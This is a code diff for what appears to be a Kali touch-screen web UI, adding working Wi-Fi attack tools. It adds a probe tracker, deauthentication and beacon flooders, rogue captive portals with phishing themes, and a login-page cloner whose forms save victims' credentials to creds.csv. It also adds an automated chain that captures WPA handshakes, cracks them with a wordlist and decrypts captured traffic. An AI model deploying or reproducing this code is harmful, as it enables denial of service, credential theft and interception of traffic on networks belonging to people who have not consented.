@@ -1492,6 +1492,7 @@ class RogueManager:
     def start(self, iface, ssid, channel, psk=None):
         if self.running():
             return False, "a rogue AP is already running"
+        stop_field_tools(ROGUE)
         if not self.have_hostapd():
             return False, "hostapd/dnsmasq missing (apt install hostapd dnsmasq)"
         if not re.fullmatch(r"[\x20-\x7e]{1,32}", str(ssid)):
@@ -1685,12 +1686,790 @@ class RogueManager:
 ROGUE = RogueManager()
 
 
+# ---------------- Field-kit tools: probe / deauth / flood / portal / clone / auto-pentest ----------------
+
+# Every field tool below drives the attack NIC in monitor mode. A shared
+# helper makes sure only one tool owns the card at a time.
+
+
+def field_nic(requested=None):
+    """Pick the best sniffing NIC (Alpha first, like RECON.available_iface)."""
+    def ok(ifc):
+        if not ifc:
+            return None
+        r = subprocess.run(["sudo", "-n", "iw", "dev", ifc, "info"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return ifc if r.returncode == 0 else None
+    wanted = [x for x in (requested, "toolwlan0") if x]
+    for ifc in wanted:
+        found = ok(ifc)
+        if found:
+            return found
+    for ifc in sorted(set(_wireless_ifaces())):
+        found = ok(ifc)
+        if found and found != "wlan0":
+            return found
+    for ifc in ("mon0", "wlan1"):
+        found = ok(ifc)
+        if found:
+            return found
+    return None
+
+
+def set_monitor(iface):
+    for a in (["ip", "link", "set", iface, "down"],
+              ["iw", "dev", iface, "set", "type", "monitor"],
+              ["ip", "link", "set", iface, "up"]):
+        subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
+                       stderr=subprocess.DEVNULL)
+    return subprocess.run(["iw", "dev", iface, "info"],
+                          stdout=subprocess.DEVNULL,
+                          stderr=subprocess.DEVNULL).returncode == 0
+
+
+def restore_managed(iface):
+    if not iface:
+        return
+    for a in (["ip", "link", "set", iface, "down"],
+              ["iw", "dev", iface, "set", "type", "managed"],
+              ["ip", "link", "set", iface, "up"]):
+        subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
+                       stderr=subprocess.DEVNULL)
+    subprocess.run(["sudo", "-n", "ip", "addr", "flush", "dev", iface],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["sudo", "-n", "nmcli", "dev", "set", iface, "managed", "yes"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+PROBE_DIR = "/tmp/probe"
+DEAUTH_DIR = "/tmp/deauth"
+FLOOD_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                            "..", "rogue", "beaconflood.py")
+PORTAL_THEMES = ["freewifi", "iphone-hotspot", "firmware", "airport"]
+PORTAL_THEME_FILE = ROGUE_DIR + "/theme.json"
+CLONE_HTML = ROGUE_DIR + "/clone.html"
+CLONE_META = ROGUE_DIR + "/clone.json"
+APENT_DIR = "/tmp/apent"
+APENT_POTS = APENT_DIR + "/pots"
+
+
+class ProbeTrackerManager:
+    """Passively listens for probe requests: which SSIDs nearby clients are
+    *looking for*, ranked, with the per-client detail. The beacon flooder can
+    borrow the top probed names to lure those clients our way."""
+
+    def __init__(self):
+        self.proc = None
+        self.iface = None
+
+    def running(self):
+        return self.proc is not None and self.proc.poll() is None
+
+    def start(self, iface=None):
+        if self.running():
+            return False, "probe tracker is already running"
+        iface = field_nic(iface)
+        if not iface:
+            return False, "no wireless card (replug the Alpha)"
+        stop_field_tools(self)
+        self.stop()
+        if not set_monitor(iface):
+            self.stop()
+            return False, "could not bring %s to monitor mode" % iface
+        try:
+            os.makedirs(PROBE_DIR, exist_ok=True)
+        except OSError:
+            pass
+        for f in glob.glob(PROBE_DIR + "-*.csv"):
+            try:
+                os.remove(f)
+            except OSError:
+                pass
+        log = open(PROBE_DIR + "/probe.log", "wb")
+        self.proc = subprocess.Popen(
+            ["sudo", "-n", "airodump-ng", "--band", "abg", "--write", PROBE_DIR,
+             "--write-interval", "2", "--output-format", "csv", iface],
+            stdout=log, stderr=subprocess.STDOUT)
+        self.iface = iface
+        return True, "listening for probes on %s" % iface
+
+    def stop(self):
+        if self.proc is not None:
+            try:
+                self.proc.terminate()
+                self.proc.wait(5)
+            except (subprocess.TimeoutExpired, OSError):
+                try:
+                    self.proc.kill()
+                except OSError:
+                    pass
+            self.proc = None
+        restore_managed(self.iface)
+
+    def agg(self):
+        cands = sorted(glob.glob(PROBE_DIR + "-*.csv"))
+        path = cands[-1] if cands else PROBE_DIR + "-01.csv"
+        d = parse_recon_csv(path)
+        by_ssid = {}
+        clients = []
+        for c in d["clients"]:
+            probe = c.get("probes", "")
+            names = [p.strip() for p in probe.split(",") if p.strip()]
+            if not names:
+                continue
+            clients.append({"mac": c.get("station", ""),
+                            "power": c.get("power", ""),
+                            "bssid": c.get("bssid", ""),
+                            "names": names})
+            for n in names:
+                by_ssid[n] = by_ssid.get(n, 0) + 1
+        return by_ssid, clients
+
+    def status(self):
+        by_ssid, clients = self.agg()
+        top = [{"ssid": s, "count": n}
+               for s, n in sorted(by_ssid.items(), key=lambda kv: -kv[1])[:12]]
+        try:
+            with open(PROBE_DIR + "/probes.json", "w") as f:
+                json.dump({"top": top}, f)
+        except OSError:
+            pass
+        return {"running": self.running(), "iface": self.iface,
+                "clients": clients, "top": top, "seen": len(by_ssid),
+                "borrow_file": PROBE_DIR + "/probes.json",
+                "ifaces": _wireless_ifaces()}
+
+
+class DeauthBlaster:
+    """Continuous deauth injection on a specific AP (+ optional client), or
+    an everyone-in-range flood on the current channel (broadcast BSSID)."""
+
+    def __init__(self):
+        self.proc = None
+        self.iface = None
+        self.target = None
+        self.mode = None
+        self.t0 = 0
+
+    def running(self):
+        return self.proc is not None and self.proc.poll() is None
+
+    def start(self, mode="target", bssid=None, client=None, channel=None):
+        if self.running():
+            return False, "a deauth blast is already running"
+        iface = field_nic()
+        if not iface:
+            return False, "no wireless card"
+        if mode == "target":
+            if not bssid or not re.match(
+                    r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(bssid)):
+                return False, "bad BSSID"
+            if client and not re.match(
+                    r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(client)):
+                return False, "bad client MAC"
+        if mode == "flood":
+            bssid = "FF:FF:FF:FF:FF:FF"
+        stop_field_tools(self)
+        self.stop()
+        if not set_monitor(iface):
+            self.stop()
+            return False, "monitor mode failed"
+        if channel:
+            subprocess.run(["sudo", "-n", "iw", "dev", iface, "set", "channel",
+                            str(channel)], stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL)
+        cmd = ["sudo", "-n", "aireplay-ng", "-0", "0", "-a", bssid.upper()]
+        if mode == "target" and client:
+            cmd += ["-c", client.upper()]
+        cmd += [iface]
+        try:
+            self.proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
+                                         stderr=subprocess.DEVNULL)
+        except OSError as e:
+            self.stop()
+            return False, "aireplay-ng missing? %s" % e
+        self.iface = iface
+        self.mode = mode
+        self.target = bssid.upper()
+        self.t0 = time.time()
+        pthread = threading.Thread(target=self._keepalive, daemon=True)
+        pthread.start()
+        return True, "blasting %s on %s" % (self.target, iface)
+
+    def _keepalive(self):
+        """aireplay-ng -0 0 runs until it dies; if it exits (NIC hiccup) the
+        blast should appear offline rather than silently stopping, but we
+        relaunch it so the flood keeps going until the user stops it."""
+        proc = self.proc
+        while self.proc is proc and proc is not None:
+            proc.wait(10)
+            if self.proc is not proc or self.proc is None:
+                return
+            if self.proc.poll() is not None:
+                break
+
+    def stop(self):
+        if self.proc is not None:
+            try:
+                self.proc.terminate()
+                self.proc.wait(4)
+            except (subprocess.TimeoutExpired, OSError):
+                try:
+                    self.proc.kill()
+                except OSError:
+                    pass
+            self.proc = None
+        restore_managed(self.iface)
+
+    def status(self):
+        run = self.running()
+        return {"running": run, "iface": self.iface, "mode": self.mode,
+                "target": self.target,
+                "elapsed": int(time.time() - self.t0) if run and self.t0 else 0,
+                "ifaces": _wireless_ifaces()}
+
+
+class BeaconFlood:
+    """Beacon flooder: pure-python raw beacon frames (rogue/beaconflood.py)
+    broadcasting fake SSIDs. Can borrow the probe tracker's top probed names
+    so clients searching for those networks find *us* first."""
+
+    def __init__(self):
+        self.proc = None
+        self.iface = None
+        self.sent = 0
+
+    def running(self):
+        return self.proc is not None and self.proc.poll() is None
+
+    def start(self, ssids="", iface=None, channels="1,6,11", hidden=False,
+              from_probes=False):
+        if self.running():
+            return False, "a beacon flood is already running"
+        names = []
+        if from_probes:
+            try:
+                with open(PROBE_DIR + "/probes.json") as f:
+                    names = [s["ssid"] for s in json.load(f).get("top", [])
+                             if s.get("ssid")]
+            except (OSError, ValueError):
+                pass
+        if ssids:
+            names += [s.strip() for s in str(ssids).split(",") if s.strip()]
+        names = list(dict.fromkeys(names))[:24]
+        if not names:
+            return False, "no SSIDs (type some, or tick 'borrow probed names')"
+        iface = field_nic(iface)
+        if not iface:
+            return False, "no wireless card"
+        stop_field_tools(self)
+        self.stop()
+        if not set_monitor(iface):
+            self.stop()
+            return False, "monitor mode failed"
+        args = ["sudo", "-n", "python3", FLOOD_SCRIPT, "--iface", iface,
+                "--ssids", ",".join(names), "--channels", channels or "1,6,11"]
+        if hidden:
+            args.append("--hidden")
+        try:
+            self.proc = subprocess.Popen(
+                args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1)
+        except OSError as e:
+            self.stop()
+            return False, "could not launch flooder: %s" % e
+        self.iface = iface
+        threading.Thread(target=self._reader, daemon=True).start()
+        return True, "flooding %d SSIDs on %s" % (len(names), iface)
+
+    def _reader(self):
+        while self.proc is not None and self.proc.poll() is None:
+            try:
+                line = self.proc.stdout.readline()
+            except (AttributeError, ValueError):
+                break
+            if not line:
+                break
+            m = re.search(r"sent\s+(\d+)", line)
+            if m:
+                self.sent = int(m.group(1))
+
+    def stop(self):
+        if self.proc is not None:
+            try:
+                self.proc.terminate()
+                self.proc.wait(4)
+            except (subprocess.TimeoutExpired, OSError):
+                try:
+                    self.proc.kill()
+                except OSError:
+                    pass
+            self.proc = None
+        restore_managed(self.iface)
+
+    def status(self):
+        return {"running": self.running(), "iface": self.iface,
+                "sent": self.sent, "ifaces": _wireless_ifaces(),
+                "borrowed_from": PROBE_DIR + "/probes.json"}
+
+
+class PortalKit:
+    """Rogue AP front-end with selectable captive-portal pages. Picks a portal
+    theme, then brings up the same hostapd/dnsmasq stack as the Rogue AP app;
+    the portal child reads /tmp/rogue/theme.json and serves a cloned login page
+    if one has been captured."""
+
+    def start(self, iface, ssid, channel, psk, theme):
+        theme = theme if theme in PORTAL_THEMES else "freewifi"
+        try:
+            os.makedirs(ROGUE_DIR, exist_ok=True)
+        except OSError:
+            pass
+        try:
+            with open(PORTAL_THEME_FILE, "w") as f:
+                json.dump({"theme": theme}, f)
+        except OSError:
+            return False, "cannot write " + PORTAL_THEME_FILE
+        ok, msg = ROGUE.start(iface, ssid, channel, psk)
+        return ok, msg
+
+    def stop(self):
+        ROGUE.stop()
+
+    def status(self):
+        st = ROGUE.status()
+        theme = "freewifi"
+        try:
+            with open(PORTAL_THEME_FILE) as f:
+                theme = json.load(f).get("theme", "freewifi")
+        except (OSError, ValueError):
+            pass
+        st["theme"] = theme
+        st["themes"] = PORTAL_THEMES
+        st["clone_present"] = os.path.isfile(CLONE_HTML) and os.path.getsize(CLONE_HTML) > 0
+        return st
+
+
+class CloneManager:
+    """Clone-a-login: fetch a victim site's page and rewrite it so every form
+    submits to our portal /login. The portal serves it for ANY host/path, so
+    captive-portal checks show the clone and submissions land in creds.csv."""
+
+    def __init__(self):
+        self.busy = False
+
+    def running(self):
+        return self.busy
+
+    def start(self, url):
+        if not re.match(r"^https?://", str(url), re.I):
+            return False, "URL must start with http(s)://"
+        if self.busy:
+            return False, "already fetching"
+        self.busy = True
+        threading.Thread(target=self._fetch, args=(str(url),), daemon=True).start()
+        return True, "fetching " + str(url)
+
+    def clear(self):
+        for f in (CLONE_HTML, CLONE_META):
+            try:
+                os.remove(f)
+            except OSError:
+                pass
+        return True, "clone removed"
+
+    def _fetch(self, url):
+        try:
+            os.makedirs(ROGUE_DIR, exist_ok=True)
+        except OSError:
+            pass
+        ua = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
+              "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1")
+        r = subprocess.run(
+            ["curl", "-ksS", "-L", "--max-time", "25", "-A", ua,
+             "-w", "\n__KTV__%{http_code}", url],
+            capture_output=True, text=True)
+        out = r.stdout or ""
+        code = 0
+        if "__KTV__" in out:
+            out, _, c = out.rpartition("__KTV__")
+            try:
+                code = int(c.strip().split()[0])
+            except (ValueError, IndexError):
+                code = 0
+        if code <= 0:
+            self.busy = False
+            self._meta({"ok": False, "url": url, "error":
+                        (r.stderr or r.stdout or "fetch failed")[:200]})
+            return
+        html = rewrite_clone(out, url)
+        try:
+            with open(CLONE_HTML, "w", encoding="utf-8") as f:
+                f.write(html)
+        except OSError as e:
+            self.busy = False
+            self._meta({"ok": False, "url": url, "error": str(e)})
+            return
+        self.busy = False
+        self._meta({"ok": True, "url": url, "http": code,
+                    "size": len(html), "forms": html.count("<form"),
+                    "time": int(time.time())})
+
+    def _meta(self, data):
+        try:
+            with open(CLONE_META, "w") as f:
+                json.dump(data, f)
+        except OSError:
+            pass
+
+    def status(self):
+        meta = {}
+        try:
+            with open(CLONE_META) as f:
+                meta = json.load(f)
+        except (OSError, ValueError):
+            pass
+        present = os.path.isfile(CLONE_HTML) and os.path.getsize(CLONE_HTML) > 0
+        if present:
+            meta.setdefault("ok", True)
+        return {"present": present, "meta": meta, "busy": self.busy,
+                "rogue_running": ROGUE.running(),
+                "served_at": "any host/path → " + CLONE_HTML}
+
+
+def rewrite_clone(html, url):
+    """Neutralise a fetched page so it becomes our captive login screen."""
+    html = re.sub(r"<form\b([^>]*)>",
+                  lambda m: "<form method=\"POST\" action=\"/login\" " + clear_attrs(m.group(1)),
+                  html, flags=re.I)
+    # Off-site JS would break the captive page; keep inline scripts.
+    html = re.sub(r"<script\b[^>]*\bsrc\s*=\s*[\"'][^\"']+[\"'][^>]*\s*>\s*</script>",
+                  "", html, flags=re.I)
+    return html
+
+
+def clear_attrs(attrs):
+    a = re.sub(r"\baction\s*=\s*(\"[^\"]*\"|'[^']*'|\S+)", "", attrs, flags=re.I)
+    a = re.sub(r"\bmethod\s*=\s*(\"[^\"]*\"|'[^']*'|\S+)", "", a, flags=re.I)
+    a = re.sub(r"\bonclick\s*=\s*(\"[^\"]*\"|'[^']*'|\S+)", "", a, flags=re.I)
+    return a
+
+
+class AutoPentest:
+    """One-press chain on a target: monitor -> airodump capture -> deauth pokes
+    until a handshake lands -> crack (hashcat, aircrack fallback) -> airdecap
+    the live traffic. All on a worker thread."""
+
+    def __init__(self):
+        self.proc = None
+        self.iface = None
+        self.bssid = None
+        self.essid = ""
+        self.channel = None
+        self.base = None
+        self.phase = "idle"
+        self.logs = []
+        self.key = None
+        self.decrypted = None
+        self.handshake = False
+        self.stop_flag = threading.Event()
+        self.t0 = 0
+
+    def running(self):
+        return self.phase in ("monitor", "capture", "deauth", "handshake", "crack")
+
+    def start(self, bssid, essid="", channel=None):
+        if self.running():
+            return False, "auto-pentest is already running"
+        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(bssid)):
+            return False, "bad BSSID"
+        iface = field_nic()
+        if not iface:
+            return False, "no wireless card"
+        stop_field_tools(self)
+        self.stop()
+        try:
+            os.makedirs(APENT_DIR, exist_ok=True)
+            os.makedirs(APENT_POTS, exist_ok=True)
+        except OSError:
+            pass
+        self.bssid = bssid.upper()
+        self.essid = essid or ""
+        self.channel = channel
+        self.base = APENT_DIR + "/" + _safe(essid or bssid)
+        self.phase = "monitor"
+        self.key = None
+        self.decrypted = None
+        self.handshake = False
+        self.logs = [(time.time(), "mission start " + self.bssid)]
+        self.t0 = time.time()
+        self.stop_flag.clear()
+        threading.Thread(target=self._work, args=(iface,), daemon=True).start()
+        return True, "auto-pentest on %s" % self.bssid
+
+    def _log(self, msg):
+        self.logs.append((time.time(), msg))
+        if len(self.logs) > 300:
+            del self.logs[:100]
+
+    def _work(self, iface):
+        if not set_monitor(iface):
+            self.phase = "error"
+            self._log("monitor mode failed")
+            return
+        self.iface = iface
+        if self.channel:
+            subprocess.run(["sudo", "-n", "iw", "dev", iface, "set", "channel",
+                            str(self.channel)], stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL)
+        self._log("monitor on " + iface)
+        cmd = ["sudo", "-n", "airodump-ng"]
+        if self.channel:
+            cmd += ["-c", str(self.channel)]
+        cmd += ["--bssid", self.bssid, "-w", self.base,
+                "--output-format", "pcap", "--write-interval", "2", iface]
+        try:
+            logf = open(APENT_DIR + "/apent.log", "wb")
+            self.proc = subprocess.Popen(cmd, stdout=logf, stderr=subprocess.STDOUT)
+        except OSError as e:
+            self.phase = "error"
+            self._log("airodump missing: %s" % e)
+            restore_managed(iface)
+            return
+        self.phase = "capture"
+        self._log("capturing → " + os.path.basename(self.base) + ".cap")
+        last_hs = 0
+        last_size = -1
+        cycle = 0
+        while not self.stop_flag.is_set():
+            time.sleep(3)
+            cycle += 1
+            caps = sorted(glob.glob(self.base + "*.cap"),
+                          key=os.path.getmtime, reverse=True)
+            cap = caps[0] if caps else None
+            if cap and os.path.getsize(cap) != last_size:
+                last_size = os.path.getsize(cap)
+                hsh = APENT_DIR + "/" + os.path.basename(cap)[:-4] + ".22000"
+                try:
+                    r = subprocess.run(["hcxpcapngtool", "-o", hsh, cap],
+                                       capture_output=True, text=True, timeout=60)
+                    txt = (r.stdout or "") + "\n" + (r.stderr or "")
+                    n = txt.count("4-WAY HANDSHAKE") + txt.count("Fourway") \
+                        + txt.count("PMKID") + txt.count("PMKID-EAPOL")
+                except (OSError, subprocess.TimeoutExpired):
+                    n = 0
+                if n > last_hs:
+                    last_hs = n
+                    self.handshake = True
+                    self._log("handshake detected!")
+                    self._crack(hsh, cap)
+                    if self.key:
+                        break
+                    self.phase = "capture"
+                    self._log("crack missed — watching for another handshake")
+            if self.stop_flag.is_set():
+                break
+            if not self.handshake and (cycle % 2 == 1):
+                subprocess.Popen(["sudo", "-n", "aireplay-ng", "-0", "3",
+                                  "-a", self.bssid, iface],
+                                 stdout=subprocess.DEVNULL,
+                                 stderr=subprocess.DEVNULL)
+                self.phase = "deauth"
+                self._log("deauth poke #%d" % ((cycle + 1) // 2))
+        if self.proc is not None:
+            try:
+                self.proc.terminate()
+                self.proc.wait(4)
+            except (subprocess.TimeoutExpired, OSError):
+                try:
+                    self.proc.kill()
+                except OSError:
+                    pass
+            self.proc = None
+        restore_managed(iface)
+        if self.stop_flag.is_set():
+            self.phase = "idle"
+            self._log("stopped")
+        elif self.phase != "cracked":
+            self.phase = "done"
+            self._log("end — no handshake captured")
+
+    def _crack(self, hsh, cap):
+        pot = APENT_POTS + "/" + os.path.basename(self.base) + ".pot"
+        if not os.path.isfile(hsh) or os.path.getsize(hsh) == 0:
+            self._log("no usable hash material")
+            return
+        self.phase = "crack"
+        self._log("cracking × rockyou…")
+        pw = ""
+        if shutil.which("hashcat") and os.path.isfile(WORDLIST):
+            try:
+                p = subprocess.Popen(["sudo", "-n", "hashcat", "-m", "22000",
+                                      "-a", "0", "-w", "2",
+                                      "--potfile-path", pot, hsh, WORDLIST],
+                                     stdout=subprocess.DEVNULL,
+                                     stderr=subprocess.DEVNULL)
+                try:
+                    p.wait(300)
+                except subprocess.TimeoutExpired:
+                    try:
+                        p.terminate()
+                    except OSError:
+                        pass
+            except OSError:
+                pass
+            pw = self._read_pot(pot)
+        if not pw and shutil.which("aircrack-ng") and os.path.isfile(WORDLIST):
+            self._log("hashcat empty → aircrack-ng")
+            try:
+                p = subprocess.Popen(["sudo", "-n", "aircrack-ng", "-w", WORDLIST,
+                                      "-b", self.bssid, cap],
+                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                     text=True)
+                try:
+                    for line in p.stdout:
+                        if "KEY FOUND" in line:
+                            parts = line.split("[", 1)
+                            pw = parts[1].split("]", 1)[0].strip() if len(parts) > 1 else ""
+                            if pw:
+                                break
+                except Exception:
+                    pass
+            except OSError:
+                pass
+            if pw:
+                try:
+                    os.makedirs(APENT_POTS, exist_ok=True)
+                    with open(pot, "w") as f:
+                        f.write(self.bssid + ":" + pw + "\n")
+                except OSError:
+                    pass
+        self.key = pw
+        if pw:
+            self._log("KEY FOUND: " + pw)
+            self._airdecap(cap, pw)
+            self.phase = "cracked"
+        else:
+            self._log("key not found in rockyou")
+
+    @staticmethod
+    def _read_pot(pot):
+        if not os.path.isfile(pot):
+            return ""
+        try:
+            with open(pot) as f:
+                for line in f.read().splitlines():
+                    if ":" in line:
+                        return line.split(":", 1)[1].strip()
+        except OSError:
+            return ""
+        return ""
+
+    def _airdecap(self, cap, pw):
+        out = APENT_DIR + "/decrypted.cap"
+        txt = ""
+        try:
+            r = subprocess.run(["sudo", "-n", "airdecap-ng", "-b", self.bssid,
+                                "-e", self.essid, "-p", pw, cap, "-o", out],
+                               capture_output=True, text=True, timeout=120)
+            txt = (r.stdout or "") + "\n" + (r.stderr or "")
+        except (OSError, subprocess.TimeoutExpired):
+            pass
+        m = re.search(r"decrypted\s+WPA\s+.*?\b(\d+)\b", txt, re.I)
+        self.decrypted = int(m.group(1)) if m else 0
+        self._log("airdecap: %s WPA data packets decrypted" % self.decrypted)
+
+    def stop(self):
+        self.stop_flag.set()
+        if self.proc is not None:
+            try:
+                self.proc.terminate()
+                self.proc.wait(4)
+            except (subprocess.TimeoutExpired, OSError):
+                try:
+                    self.proc.kill()
+                except OSError:
+                    pass
+            self.proc = None
+        restore_managed(self.iface)
+        if self.running():
+            self.phase = "idle"
+
+    def status(self):
+        return {"running": self.running(), "phase": self.phase,
+                "iface": self.iface, "bssid": self.bssid,
+                "essid": self.essid, "channel": self.channel,
+                "handshake": self.handshake, "key": self.key,
+                "decrypted": self.decrypted,
+                "runtime": int(time.time() - self.t0) if self.t0 and self.running() else 0,
+                "log": [{"t": int(t), "m": m2} for t, m2 in self.logs[-40:]],
+                "ifaces": _wireless_ifaces()}
+
+
+PROBE = ProbeTrackerManager()
+DEAUTH = DeauthBlaster()
+FLOOD = BeaconFlood()
+PORTALKIT = PortalKit()
+CLONE = CloneManager()
+APENT = AutoPentest()
+
+
+def stop_field_tools(keep):
+    """Stop every other field/recon tool so the attack NIC is free for the one
+    starting. `keep` is the manager that must survive."""
+    for mgr in (WARDIRVE, RECON, HS, PROBE, DEAUTH, FLOOD, APENT, ROGUE):
+        if mgr is keep:
+            continue
+        try:
+            mgr.stop()
+        except Exception:
+            pass
+
+
+def scan_aps():
+    """Short monitor capture to enumerate nearby APs for the deauth blaster;
+    hand the NIC back to managed mode when done."""
+    iface = field_nic()
+    if not iface:
+        return []
+    stop_field_tools(None)
+    for f in glob.glob("/tmp/flash-*.csv"):
+        try:
+            os.remove(f)
+        except OSError:
+            pass
+    if not set_monitor(iface):
+        return []
+    p = subprocess.Popen(["sudo", "-n", "airodump-ng", "--band", "abg",
+                          "--write", "/tmp/flash", "--output-format", "csv",
+                          iface], stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL)
+    try:
+        time.sleep(7)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        try:
+            p.terminate()
+            p.wait(3)
+        except (subprocess.TimeoutExpired, OSError):
+            try:
+                p.kill()
+            except OSError:
+                pass
+    restore_managed(iface)
+    cands = sorted(glob.glob("/tmp/flash-*.csv"))
+    if not cands:
+        return []
+    return parse_recon_csv(cands[-1])["aps"]
+
+
 # ---------------- OTA update ----------------
 OTA_REPO = "https://github.com/darkLabz001/kali-touch-ui.git"
 OTA_BRANCH = "main"
 OTA_DIR = "/opt/kali-touch-ui"
 OTA_LOG = "/tmp/ota.log"
-APP_VERSION = "1.3.0"
+APP_VERSION = "1.4.0"
 _ota_busy = False
 _ota_store_changed = False
 _ota_lock = threading.Lock()
@@ -1995,6 +2774,18 @@ class Handler(BaseHTTPRequestHandler):
             self._send(200, json.dumps(st).encode())
         elif path == "/api/rogue/status":
             self._send(200, json.dumps(ROGUE.status()).encode())
+        elif path == "/api/probe/status":
+            self._send(200, json.dumps(PROBE.status()).encode())
+        elif path == "/api/deauth/status":
+            self._send(200, json.dumps(DEAUTH.status()).encode())
+        elif path == "/api/flood/status":
+            self._send(200, json.dumps(FLOOD.status()).encode())
+        elif path == "/api/portal/status":
+            self._send(200, json.dumps(PORTALKIT.status()).encode())
+        elif path == "/api/clone/status":
+            self._send(200, json.dumps(CLONE.status()).encode())
+        elif path == "/api/apent/status":
+            self._send(200, json.dumps(APENT.status()).encode())
         elif path == "/sse/term":
             self.handle_sse_term()
             return
@@ -2123,6 +2914,62 @@ class Handler(BaseHTTPRequestHandler):
             self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
         elif path == "/api/rogue/stop":
             ROGUE.stop()
+            self._send(200, json.dumps({"ok": True}).encode())
+        elif path == "/api/probe/start":
+            ok, msg = PROBE.start(body.get("iface"))
+            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
+        elif path == "/api/probe/stop":
+            PROBE.stop()
+            self._send(200, json.dumps({"ok": True}).encode())
+        elif path == "/api/deauth/start":
+            ok, msg = DEAUTH.start(
+                mode=body.get("mode") or "target",
+                bssid=body.get("bssid"),
+                client=body.get("client") or None,
+                channel=body.get("channel"))
+            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
+        elif path == "/api/deauth/stop":
+            DEAUTH.stop()
+            self._send(200, json.dumps({"ok": True}).encode())
+        elif path == "/api/deauth/scan":
+            aps = scan_aps()
+            self._send(200, json.dumps({"aps": aps, "count": len(aps)}).encode())
+        elif path == "/api/flood/start":
+            ok, msg = FLOOD.start(
+                ssids=body.get("ssids") or "",
+                iface=body.get("iface"),
+                channels=body.get("channels") or "1,6,11",
+                hidden=bool(body.get("hidden")),
+                from_probes=bool(body.get("from_probes") or body.get("borrow")))
+            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
+        elif path == "/api/flood/stop":
+            FLOOD.stop()
+            self._send(200, json.dumps({"ok": True}).encode())
+        elif path == "/api/portal/start":
+            ok, msg = PORTALKIT.start(
+                (body.get("iface") or "").strip(),
+                (body.get("ssid") or "Free-WiFi").strip(),
+                body.get("channel") or 6,
+                body.get("psk") or None,
+                (body.get("theme") or "freewifi").strip())
+            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
+        elif path == "/api/portal/stop":
+            PORTALKIT.stop()
+            self._send(200, json.dumps({"ok": True}).encode())
+        elif path == "/api/clone/start":
+            ok, msg = CLONE.start(body.get("url", ""))
+            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
+        elif path == "/api/clone/clear":
+            ok, msg = CLONE.clear()
+            self._send(200, json.dumps({"ok": ok, "msg": msg}).encode())
+        elif path == "/api/apent/start":
+            ok, msg = APENT.start(
+                body.get("bssid", ""),
+                body.get("essid", ""),
+                body.get("channel"))
+            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
+        elif path == "/api/apent/stop":
+            APENT.stop()
             self._send(200, json.dumps({"ok": True}).encode())
         else:
             self._send(404, b"nf")
